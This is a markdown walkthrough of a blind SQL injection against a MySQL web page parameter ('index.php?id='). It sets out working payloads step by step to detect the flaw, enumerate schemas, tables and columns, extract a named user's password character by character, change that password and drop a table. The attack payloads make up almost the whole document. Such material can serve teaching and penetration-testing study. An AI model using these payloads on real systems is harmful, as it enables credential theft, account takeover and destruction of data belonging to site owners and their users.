# SQL Injection Example

## Purpose
Find table about user information, get user password, modify user password, drop user table;

## Injection Dectection
> index.php?id=1 AND 1 = 1

Working

> index.php?id=1 AND 1 = 2

Broken. Injectable~!

## Find Database
> index.php?id=1 AND 1 <= (SELECT count(*) FROM information_schema.schemata where schema_name like '%member%')

> index.php?id=1 AND 6 = (SELECT CHAR_LENGTH(schema_name) FROM information_schema.schemata where schema_name like '%member%')

Got Database member

## Find Table

> index.php?id=1 AND 1 <= (SELECT count(*) FROM information_schema.tables WHERE table_schema = 'member')

> index.php?id=1 AND 1 <= (SELECT count(*) FROM information_schema.tables WHERE table_schema = 'member' AND table_name like '%user%')

False

> index.php?id=1 AND 1 <= (SELECT count(*) FROM information_schema.tables WHERE table_schema = 'member' AND table_name like '%member%')

> index.php?id=1 AND 1 <= (SELECT count(*) FROM member.members)

Got Table Name, members!

## Find Table Field

> SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’

> index.php?id=1 AND 1 <= (SELECT count(*) FROM information_schema.columns WHERE table_schema = 'member' AND table_name = 'members' AND column_name like '%account%')

> index.php?id=1 AND 1 <= (SELECT count(*) FROM member.members where password IS NOT NULL)

Got password Field!

> index.php?id=1 AND 1 <= (SELECT count(*) FROM member.members where account IS NOT NULL)

Got account Field!

## Guess Password

* Guess Password Length

> index.php?id=1 AND 5 < (SELECT CHAR_LENGTH(password) FROM member.members where account = 'dinos80152')

> index.php?id=1 AND 3 = (SELECT CHAR_LENGTH(password) FROM member.members where account = 'dinos80152')

Got Password has 3 chars

* Guess Password, Loop a-z A-Z 1-9

> index.php?id=1 AND 'a' = (SELECT substr(password, 1, 1) FROM member.members where account = 'dinos80152')

Got Password is abc

## Manipulate Table

* Update User Password
> index.php?id=1;Update member.members set password = 'bcd' where account = 'dinos80152'

* Drop Table
> index.php?id=1;Drop Table member.members2

## Reference
* [MySQL SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)